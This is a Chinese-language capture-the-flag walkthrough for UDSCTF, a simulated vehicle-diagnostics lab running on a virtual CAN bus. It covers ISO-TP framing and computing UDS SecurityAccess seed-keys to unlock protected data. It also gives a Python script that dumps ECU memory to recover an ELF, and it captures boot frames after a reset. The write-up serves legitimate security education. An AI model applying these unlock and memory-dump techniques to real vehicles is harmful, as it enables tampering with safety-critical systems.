# 车联网靶场:UDSCTF 学习与靶场通关记录

> 项目地址：`https://github.com/yichen115/UDSCTF`  
> 实验环境：Ubuntu 虚拟机 + Docker + SocketCAN/vcan  
> 靶场类型：UDS（Unified Diagnostic Services）教学型车联网安全靶场  
> 完成状态：5/5 Flag 全部获取

---

## 一、学习目标

本次实验主要围绕车载诊断协议 UDS、ISO-TP 分帧机制和虚拟 CAN 总线展开，完成以下目标：

1. 在 Ubuntu 中部署 UDSCTF。
2. 使用 Docker 启动模拟 ECU。
3. 使用 `vcan0` 构建虚拟 CAN 总线环境。
4. 掌握 `candump`、`cansend`、`isotprecv` 等工具。
5. 理解 UDS 服务：
   - `0x10 DiagnosticSessionControl`
   - `0x11 ECUReset`
   - `0x22 ReadDataByIdentifier`
   - `0x23 ReadMemoryByAddress`
   - `0x27 SecurityAccess`
6. 理解 ISO-TP 单帧、首帧、连续帧和流控帧。
7. 完成 Seed-Key 安全访问。
8. 读取 ECU 模拟内存并恢复 ELF 数据。
9. 捕获 ECU 重启后的启动报文。
10. 获取全部 5 个 Flag。

---

## 二、环境准备

### 2.1 基础软件安装

```bash
sudo apt update
sudo apt install -y git docker.io can-utils kmod python3
sudo systemctl enable --now docker
```

检查 Docker：

```bash
sudo docker version
```

### 2.2 加载 CAN 内核模块

```bash
sudo modprobe can
sudo modprobe can_raw
sudo modprobe vcan
```

检查模块：

```bash
lsmod | grep -E 'vcan|can_raw'
```

---

## 三、下载项目

最初使用：

```bash
git clone https://github.com/yichen115/UDSCTF.git
```

出现错误：

```text
GnuTLS recv error (-54): Error in the pull function
```

该问题属于 GitHub TLS 连接中断，不是项目不存在。

可尝试：

```bash
git -c http.version=HTTP/1.1 clone --depth 1 \
  https://github.com/yichen115/UDSCTF.git
```

如果 Git 仍然失败，可通过 ZIP 下载：

```bash
curl -L \
  --http1.1 \
  --retry 10 \
  --retry-delay 3 \
  --retry-all-errors \
  https://codeload.github.com/yichen115/UDSCTF/zip/refs/heads/main \
  -o UDSCTF.zip

unzip UDSCTF.zip
mv UDSCTF-main UDSCTF
cd UDSCTF
```

---

## 四、构建 Docker 镜像

进入项目目录：

```bash
cd /home/myubuntu/UDSCTF
```

构建镜像：

```bash
sudo docker build -t udsctf:latest .
```

构建初期出现基础镜像下载重试：

```text
d5fd17ec1767: Retrying in 5 seconds
```

单独拉取 Ubuntu 20.04 镜像后解决：

```bash
sudo docker pull ubuntu:20.04
```

再次构建：

```bash
sudo docker build -t udsctf:latest .
```

说明：

```text
DEPRECATED: The legacy builder is deprecated
```

只是 Docker Legacy Builder 的弃用警告，不是本次构建失败原因。

---

## 五、启动靶场

推荐只绑定本地回环地址，避免固定弱密码暴露到局域网或公网：

```bash
sudo docker rm -f udsctf-container 2>/dev/null || true

sudo docker run -d \
  --name udsctf-container \
  --privileged \
  -p 127.0.0.1:2222:22 \
  --restart unless-stopped \
  udsctf:latest
```

查看日志：

```bash
sudo docker logs -f udsctf-container
```

检查虚拟 CAN：

```bash
sudo docker exec udsctf-container ip link show vcan0
```

通过 SSH 登录：

```bash
ssh -p 2222 ctfuser@127.0.0.1
```

默认账号：

```text
用户名：ctfuser
密码：ctfpassword
```

---

## 六、基础工具说明

### 6.1 candump

监听 CAN 总线：

```bash
candump vcan0
```

典型输出：

```text
vcan0  7E0   [4]  03 22 F1 90
vcan0  7E8   [8]  10 1C 62 F1 90 55 44 53
```

### 6.2 cansend

发送原始 CAN 帧：

```bash
cansend vcan0 7E0#0322F190
```

格式：

```text
接口 CAN_ID#DATA
```

### 6.3 isotprecv

自动处理 ISO-TP 多帧接收和 Flow Control：

```bash
timeout 3 isotprecv \
  -s 7E0 \
  -d 7E8 \
  vcan0
```

注意：

- `-s 7E0`：本地发送 Flow Control 的 CAN ID。
- `-d 7E8`：接收 ECU 响应的 CAN ID。
- 之前曾把方向写反，导致接收到自己发送的 `22 F1 90` 请求。

---

# 七、Flag 1：读取 VIN DID

## 7.1 发送请求

```bash
cansend vcan0 7E0#0322F190
```

含义：

```text
03       单帧有效数据长度
22       ReadDataByIdentifier
F190     VIN DID
```

监听到：

```text
7E0  [4] 03 22 F1 90
7E8  [8] 10 1C 62 F1 90 55 44 53
```

其中：

```text
10 1C       ISO-TP First Frame，总长度 0x1C
62 F1 90    对 22 F190 的肯定响应
55 44 53    ASCII：UDS
```

由于响应超过 7 字节，需要 ISO-TP 多帧传输。

## 7.2 使用 isotprecv 自动接收

```bash
rm -f /tmp/uds-response.hex

timeout 3 isotprecv \
  -s 7E0 \
  -d 7E8 \
  vcan0 > /tmp/uds-response.hex &

PID=$!

sleep 0.2

cansend vcan0 7E0#0322F190

wait "$PID"

cat /tmp/uds-response.hex
```

完整响应：

```text
62 F1 90 55 44 53 43 54 46 7B 56 49 4E 59 49 43 48 45 4E 30 30 31 31 32 32 33 33 7D
```

跳过前三个 UDS 响应头字节并转 ASCII：

```bash
awk '{
  for (i=4; i<=NF; i++)
    printf "%s", $i
}' /tmp/uds-response.hex | xxd -r -p

echo
```

获得：

```text
UDSCTF{VINYICHEN00112233}
```

## 7.3 知识点

- `0x22` 用于读取 DID。
- `0xF190` 通常用于 VIN。
- 长响应需要 ISO-TP 多帧。
- ECU 响应 ID 为 `0x7E8`，请求 ID 为 `0x7E0`。
- 本项目 Flag 为静态内置字符串，不是动态生成。

---

# 八、Flag 2：SecurityAccess Level 1

## 8.1 未授权读取测试

```bash
cansend vcan0 7E0#0322C1C2
```

未解锁时会返回否定响应：

```text
7F 22 33
```

含义：

```text
7F       否定响应
22       原请求服务
33       SecurityAccessDenied
```

## 8.2 请求 Level 1 Seed

```bash
cansend vcan0 7E0#022701
```

响应示例：

```text
06 67 01 31 93 41 55
```

其中 Seed：

```text
31934155
```

## 8.3 Seed-Key 算法

```text
Key = Seed XOR 0xDEADBEEF
```

计算：

```bash
python3 - <<'PY'
seed = int("31934155", 16)
key = seed ^ 0xDEADBEEF
print(f"Seed = {seed:08X}")
print(f"Key  = {key:08X}")
PY
```

结果：

```text
Seed = 31934155
Key  = EF3EFFBA
```

## 8.4 提交 Key

```bash
cansend vcan0 7E0#062702EF3EFFBA
```

结构：

```text
06          有效数据长度
27          SecurityAccess
02          Level 1 Key
EF3EFFBA    四字节 Key
```

成功响应：

```text
02 67 02
```

## 8.5 读取 DID C1C2

```bash
rm -f /tmp/secure-flag.hex

timeout 3 isotprecv \
  -s 7E0 \
  -d 7E8 \
  vcan0 > /tmp/secure-flag.hex &

PID=$!
sleep 0.2

cansend vcan0 7E0#0322C1C2

wait "$PID"
cat /tmp/secure-flag.hex
```

转换：

```bash
awk '{
  for (i=4; i<=NF; i++)
    printf "%s", $i
}' /tmp/secure-flag.hex | xxd -r -p

echo
```

获得：

```text
UDSCTF{27_securityX0r_C1C2}
```

## 8.6 知识点

- `0x27 01` 请求 Seed。
- `0x27 02` 提交 Key。
- 请求新的 Seed 后，旧 Seed 对应的 Key 可能失效。
- Seed-Key 算法是 ECU 厂商自定义逻辑。
- `0x35` 常表示 InvalidKey。
- Shell heredoc 的结束标志 `PY` 必须单独占一行。

---

# 九、Flag 3：编程会话 + SecurityAccess Level 3

## 9.1 进入编程会话

```bash
cansend vcan0 7E0#021002
```

含义：

```text
10       DiagnosticSessionControl
02       ProgrammingSession
```

成功响应关键字段：

```text
50 02
```

## 9.2 请求 Level 3 Seed

```bash
cansend vcan0 7E0#022703
```

实际 Seed：

```text
30EB6521
```

## 9.3 Level 3 算法

```python
key = ((seed << 7) | (seed >> 25)) & 0xFFFFFFFF
key ^= 0xCAFEBABE
key = (key + 0x12345678) & 0xFFFFFFFF
key = (key & 0xFFFF0000) | ((key & 0xFFFF) ^ 0xABCD)
key ^= 0xDEADBEEF
```

计算命令：

```bash
python3 -c 'seed=int("30EB6521",16); key=((seed<<7)|(seed>>25))&0xffffffff; key^=0xCAFEBABE; key=(key+0x12345678)&0xffffffff; key=(key&0xffff0000)|((key&0xffff)^0xABCD); key^=0xDEADBEEF; print(f"Seed = {seed:08X}"); print(f"Key  = {key&0xffffffff:08X}")'
```

结果：

```text
Seed = 30EB6521
Key  = 0F2D95BC
```

## 9.4 提交 Level 3 Key

```bash
cansend vcan0 7E0#0627040F2D95BC
```

成功响应：

```text
02 67 04
```

## 9.5 读取 D1D2

```bash
rm -f /tmp/advanced-flag.hex

timeout 3 isotprecv \
  -s 7E0 \
  -d 7E8 \
  vcan0 > /tmp/advanced-flag.hex &

PID=$!
sleep 0.2

cansend vcan0 7E0#0322D1D2

wait "$PID"
cat /tmp/advanced-flag.hex
```

转换：

```bash
awk '{
  for (i=4; i<=NF; i++)
    printf "%s", $i
}' /tmp/advanced-flag.hex | xxd -r -p

echo
```

获得：

```text
UDSCTF{D1D2_Advanced_Flag}
```

## 9.6 知识点

- 某些 SecurityAccess Level 只允许在特定诊断会话中使用。
- `0x10 02` 是编程会话。
- `0x27 03` 请求 Level 3 Seed。
- `0x27 04` 提交 Level 3 Key。
- 如果未进入编程会话，可能返回服务在当前会话中不支持的否定响应。

---

# 十、Flag 4：SecurityAccess Level 5 + 内存读取

## 10.1 请求 Level 5 Seed

```bash
cansend vcan0 7E0#022705
```

实际 Seed：

```text
6D765F33
```

## 10.2 Level 5 算法

```python
key = seed
key ^= 0x12345678
key ^= 0x87654321
key = ((key >> 13) | (key << 19)) & 0xFFFFFFFF
key = (key & 0xFF00FF00) | ((key & 0x00FF00FF) ^ 0x55555555)
key = (key + 0xDEADBEEF) & 0xFFFFFFFF
key ^= 0xCAFEBABE
```

计算：

```bash
python3 -c '
seed=int("6D765F33",16)
key=seed
key ^= 0x12345678
key ^= 0x87654321
key = ((key >> 13) | (key << 19)) & 0xffffffff
key = (key & 0xff00ff00) | ((key & 0x00ff00ff) ^ 0x55555555)
key = (key + 0xdeadbeef) & 0xffffffff
key ^= 0xcafebabe
print(f"Seed = {seed:08X}")
print(f"Key  = {key & 0xffffffff:08X}")
'
```

结果：

```text
Seed = 6D765F33
Key  = FF4E2EE0
```

## 10.3 提交 Level 5 Key

```bash
cansend vcan0 7E0#062706FF4E2EE0
```

成功响应：

```text
02 67 06
```

## 10.4 读取第一块内存

```bash
rm -f /tmp/memory-block.hex

timeout 5 isotprecv \
  -s 7E0 \
  -d 7E8 \
  vcan0 > /tmp/memory-block.hex &

PID=$!
sleep 0.2

cansend vcan0 7E0#0723144000000050

wait "$PID"
cat /tmp/memory-block.hex
```

请求结构：

```text
07          单帧长度
23          ReadMemoryByAddress
14          地址长度 4 字节，大小长度 1 字节
40000000    起始地址
50          读取 0x50 字节
```

响应开头：

```text
63 14 7F 45 4C 46
```

其中：

```text
63          0x23 的肯定响应
14          地址和大小格式
7F454C46    ELF 文件魔数
```

查看二进制：

```bash
awk '{
  for (i=3; i<=NF; i++)
    printf "%s", $i
}' /tmp/memory-block.hex | xxd -r -p | xxd
```

结果：

```text
00000000: 7f45 4c46 ...
```

证明 `0x40000000` 映射的是一个 ELF 文件。

## 10.5 连续 Dump ELF

创建脚本：

```python
#!/usr/bin/env python3

import re
import struct
import time
import isotp

START_ADDRESS = 0x40000000
DUMP_SIZE = 0x20000
STEP = 0x50
OUTPUT_FILE = "/tmp/uds_memory_dump.bin"

sock = isotp.socket()
sock.settimeout(3.0)

try:
    address = isotp.Address(
        isotp.AddressingMode.Normal_11bits,
        txid=0x7E0,
        rxid=0x7E8,
    )
except (AttributeError, TypeError):
    address = isotp.Address(
        txid=0x7E0,
        rxid=0x7E8,
    )

sock.bind("vcan0", address)

dump_data = bytearray()
seen_flags = set()

print(
    f"[+] Dump 范围: "
    f"0x{START_ADDRESS:08X}-0x{START_ADDRESS + DUMP_SIZE:08X}"
)
print(f"[+] 输出文件: {OUTPUT_FILE}")

try:
    with open(OUTPUT_FILE, "wb") as output:
        for offset in range(0, DUMP_SIZE, STEP):
            address_value = START_ADDRESS + offset
            read_size = min(STEP, DUMP_SIZE - offset)

            request = (
                bytes([0x23, 0x14])
                + struct.pack(">I", address_value)
                + bytes([read_size])
            )

            try:
                sock.send(request)
                response = sock.recv()
            except Exception as exc:
                print(
                    f"\n[-] 读取 0x{address_value:08X} 失败: {exc}"
                )
                break

            if not response:
                print(f"\n[-] 读取 0x{address_value:08X} 无响应")
                break

            if response[0] == 0x7F:
                print(f"\n[-] 否定响应: {response.hex(' ')}")
                break

            if response[:2] != b"\x63\x14":
                print(f"\n[-] 异常响应: {response.hex(' ')}")
                break

            chunk = response[2:2 + read_size]

            output.write(chunk)
            output.flush()
            dump_data.extend(chunk)

            percent = len(dump_data) / DUMP_SIZE * 100

            print(
                f"\r[+] 地址 0x{address_value:08X} "
                f"已读取 {len(dump_data):6d} 字节 "
                f"({percent:6.2f}%)",
                end="",
                flush=True,
            )

            flags = set(
                re.findall(
                    rb"UDSCTF\{[^}\x00\r\n]{1,100}\}",
                    dump_data,
                )
            )

            for flag in flags - seen_flags:
                print(
                    "\n[!] 发现 Flag:",
                    flag.decode("ascii", errors="replace"),
                )
                seen_flags.add(flag)

            if any(b"ReadMemory" in flag for flag in seen_flags):
                print("\n[+] 已找到内存读取关卡 Flag。")
                break

            time.sleep(0.01)

finally:
    sock.close()

print(f"\n[+] 实际保存 {len(dump_data)} 字节")
```

运行：

```bash
python3 -m py_compile /tmp/dump_elf.py
python3 /tmp/dump_elf.py
```

实际结果：

```text
[+] 地址 0x40008B60 已读取 35760 字节 (27.28%)
[!] 发现 Flag: UDSCTF{ReadMemory_T0_Find_Flag}
[+] 已找到内存读取关卡 Flag。
```

搜索 Dump 文件：

```bash
grep -aoE 'UDSCTF\{[^}]+\}' \
  /tmp/uds_memory_dump.bin |
sort -u
```

获得：

```text
UDSCTF{ReadMemory_T0_Find_Flag}
```

## 10.6 知识点

- `0x23` 可以读取 ECU 内存。
- 地址和读取长度由 AddressAndLengthFormatIdentifier 描述。
- 本靶场中起始地址为 `0x40000000`。
- 通过读取内存可以恢复 ELF 文件。
- 在真实 ECU 中，未受保护的内存读取可能泄漏固件、密钥、算法和敏感配置。
- 本项目 Flag 作为静态字符串编译进程序，因此可以通过 Dump ELF 搜索出来。

---

# 十一、Flag 5：ECU Reset 启动报文

## 11.1 ECU Reset 请求

```bash
cansend vcan0 7E0#021101
```

含义：

```text
02       单帧长度
11       ECUReset
01       HardReset
```

## 11.2 捕获脚本

```python
#!/usr/bin/env python3

import time
import can

CAN_ID = 0x7E8
TIMEOUT = 15

bus = can.interface.Bus(
    channel="vcan0",
    bustype="socketcan",
)

deadline = time.time() + TIMEOUT
payload = bytearray()
total_length = None
next_sequence = 1

print("[+] 等待 ECU 重启后的 0x7E8 启动报文……")

try:
    while time.time() < deadline:
        message = bus.recv(timeout=1.0)

        if message is None or message.arbitration_id != CAN_ID:
            continue

        data = bytes(message.data)
        if not data:
            continue

        frame_type = data[0] >> 4

        print(
            f"[+] 7E8 [{len(data)}] "
            + " ".join(f"{byte:02X}" for byte in data)
        )

        if frame_type == 0x1:
            total_length = ((data[0] & 0x0F) << 8) | data[1]
            payload = bytearray(data[2:])
            next_sequence = 1

        elif frame_type == 0x2 and total_length is not None:
            sequence = data[0] & 0x0F

            if sequence != next_sequence:
                print(
                    f"[-] 分帧序号错误：期望 {next_sequence}，"
                    f"收到 {sequence}"
                )
                break

            payload.extend(data[1:])
            next_sequence = (next_sequence + 1) & 0x0F

        if total_length is not None and len(payload) >= total_length:
            payload = payload[:total_length]

            print("[+] 完整 UDS 数据：", payload.hex(" "))

            if payload[:3] == b"\x62\x00\x00":
                flag = payload[3:].decode(
                    "ascii",
                    errors="replace",
                )
                print("[!] Boot Flag：", flag)
            else:
                print(
                    "[!] 完整响应：",
                    payload.decode("ascii", errors="replace"),
                )

            break
    else:
        print("[-] 监听超时，没有捕获到完整启动报文。")

finally:
    bus.shutdown()
```

执行顺序：

```bash
python3 /tmp/capture_boot.py &
PID=$!

sleep 0.5

cansend vcan0 7E0#021101

wait "$PID"
```

捕获结果：

```text
[+] 7E8 [8] 10 1F 62 00 00 55 44 53
[+] 7E8 [8] 21 43 54 46 7B 52 65 73
[+] 7E8 [8] 22 65 74 5F 54 68 45 5F
[+] 7E8 [8] 23 55 44 53 5F 53 65 72
[+] 7E8 [5] 24 76 65 72 7D
```

重组后：

```text
62 00 00 55 44 53 43 54 46 7B 52 65 73 65 74 5F 54 68 45 5F 55 44 53 5F 53 65 72 76 65 72 7D
```

获得：

```text
UDSCTF{Reset_ThE_UDS_Server}
```

## 11.3 警告处理

Python 输出：

```text
DeprecationWarning: The 'bustype' argument is deprecated
```

该警告不影响本次运行。

可以将：

```python
bus = can.interface.Bus(
    channel="vcan0",
    bustype="socketcan",
)
```

改为：

```python
bus = can.Bus(
    channel="vcan0",
    interface="socketcan",
)
```

---

# 十二、全部 Flag 汇总

| 序号 | 获取方式 | Flag |
|---|---|---|
| Flag 1 | `0x22 F190` 读取 VIN DID | `UDSCTF{VINYICHEN00112233}` |
| Flag 2 | Level 1 SecurityAccess + DID `C1C2` | `UDSCTF{27_securityX0r_C1C2}` |
| Flag 3 | 编程会话 + Level 3 + DID `D1D2` | `UDSCTF{D1D2_Advanced_Flag}` |
| Flag 4 | Level 5 + `0x23` 内存 Dump | `UDSCTF{ReadMemory_T0_Find_Flag}` |
| Flag 5 | `0x11 01` ECU Reset + 启动报文 | `UDSCTF{Reset_ThE_UDS_Server}` |

---

# 十三、常见错误与排查记录

## 13.1 GitHub 克隆失败

错误：

```text
GnuTLS recv error (-54)
```

处理：

```bash
git -c http.version=HTTP/1.1 clone --depth 1 \
  https://github.com/yichen115/UDSCTF.git
```

或改用 ZIP。

## 13.2 Docker 拉取基础镜像卡住

处理：

```bash
sudo docker pull ubuntu:20.04
sudo docker build -t udsctf:latest .
```

## 13.3 isotprecv 接收到自己的请求

错误参数：

```bash
isotprecv -s 7E8 -d 7E0 vcan0
```

错误结果：

```text
22 F1 90
```

正确参数：

```bash
isotprecv -s 7E0 -d 7E8 vcan0
```

## 13.4 xxd 输出乱码

当文件内容只有：

```text
22 F1 90
```

转换后出现：

```text
"�
```

原因是接收到的是 UDS 请求原始字节，不是 ASCII Flag。

## 13.5 Python heredoc 卡住

错误原因：结束标志没有单独占一行。

正确格式：

```bash
python3 - <<'PY'
print("test")
PY
```

## 13.6 Dump 文件不存在

错误：

```text
grep: /tmp/uds_memory_dump.bin: No such file or directory
```

原因：

- 只创建了脚本；
- 没有执行脚本；
- 或脚本存在语法错误。

正确流程：

```bash
python3 -m py_compile /tmp/dump_elf.py
python3 /tmp/dump_elf.py
grep -aoE 'UDSCTF\{[^}]+\}' /tmp/uds_memory_dump.bin
```

## 13.7 SecurityAccess Key 错误

常见响应：

```text
7F 27 35
```

原因可能包括：

1. Seed 抄错。
2. 字节序错误。
3. 使用了旧 Seed。
4. 期间又请求了一次新 Seed。
5. 算法实现错误。
6. 当前诊断会话不符合要求。

---

# 十四、UDS 服务速查

| 服务 | 名称 | 本次用途 |
|---|---|---|
| `0x10` | DiagnosticSessionControl | 切换编程会话 |
| `0x11` | ECUReset | 触发 ECU 重启 |
| `0x22` | ReadDataByIdentifier | 读取 F190、C1C2、D1D2 |
| `0x23` | ReadMemoryByAddress | Dump 模拟 ECU 内存 |
| `0x27` | SecurityAccess | Seed-Key 鉴权 |

肯定响应通常为：

```text
请求 SID + 0x40
```

例如：

```text
0x22 -> 0x62
0x27 -> 0x67
0x23 -> 0x63
0x10 -> 0x50
0x11 -> 0x51
```

否定响应格式：

```text
7F 原服务SID NRC
```

---

# 十五、ISO-TP 分帧速查

## 单帧 Single Frame

```text
0L DATA...
```

例如：

```text
03 22 F1 90
```

其中 `03` 表示后续有 3 字节有效数据。

## 首帧 First Frame

```text
1XXX DATA...
```

例如：

```text
10 1C 62 F1 90 55 44 53
```

总长度：

```text
0x01C = 28 字节
```

## 流控帧 Flow Control

```text
30 00 00 ...
```

含义：

```text
30    Continue To Send
00    Block Size 不限制
00    STmin 最小分帧间隔
```

## 连续帧 Consecutive Frame

```text
21 ...
22 ...
23 ...
```

低 4 位为序号。

---

# 十六、靶场评价

## 优点

1. 部署简单，适合 UDS 入门。
2. 覆盖多个典型 UDS 服务。
3. 可以练习 ISO-TP 多帧。
4. 可以练习 Seed-Key。
5. 包含会话控制、DID、内存读取和 ECU Reset。
6. 适合作为 ICSim 之后的进阶练习。

## 局限

1. Flag 全部静态内置在源码和二进制中。
2. 仓库公开了 `solve.py`，无法用于严格竞赛。
3. Seed-Key 算法直接存在于源码。
4. 环境主要是单 ECU 和虚拟 CAN。
5. 没有覆盖 Wi-Fi、蓝牙、蜂窝网络、T-Box、IVI、DoIP 等更完整车联网攻击面。
6. 更接近教学靶场，而不是完整实车渗透环境。

---

# 十七、本次学习成果

本次实验已经掌握：

- Ubuntu 下 Docker 靶场部署。
- SocketCAN 和 `vcan0` 使用。
- CAN 报文监听与发送。
- UDS 请求和响应解析。
- ISO-TP 多帧重组。
- Seed-Key 算法实现。
- 诊断会话切换。
- DID 权限控制。
- ECU 内存读取。
- ELF 文件识别。
- Python 自动化 CAN 通信。
- ECU Reset 后启动流量捕获。

---

# 十八、后续练习建议

1. 不查看 `uds_server.c` 和 `solve.py`，重新独立完成一次。
2. 编写统一的 UDS 客户端脚本，封装：
   - 单帧请求
   - ISO-TP 接收
   - SecurityAccess
   - DID 扫描
   - 内存 Dump
3. 对 DID 范围进行自动枚举。
4. 对 SecurityAccess 子功能进行扫描。
5. 对服务 SID 进行探测，记录否定响应码。
6. 使用 Caring Caribou 进行 UDS 枚举。
7. 使用 `python-can` 和 `can-isotp` 编写自动化诊断工具。
8. 进一步学习 DoIP、T-Box、IVI、Wi-Fi、蓝牙和 SOME/IP。
9. 在合法隔离环境中练习真实 ECU 或车联网硬件靶场。

---

## 最终结论

UDSCTF 是一个适合 UDS 初学者的教学靶场。虽然 Flag 和算法都直接存在于源码中，但通过实际部署、手工构造报文、处理 ISO-TP、计算 Seed-Key、读取内存和捕获 ECU Reset 启动报文，可以建立较完整的 UDS 攻防基础。

本次实验已完成全部 5 个 Flag，靶场正式通关。
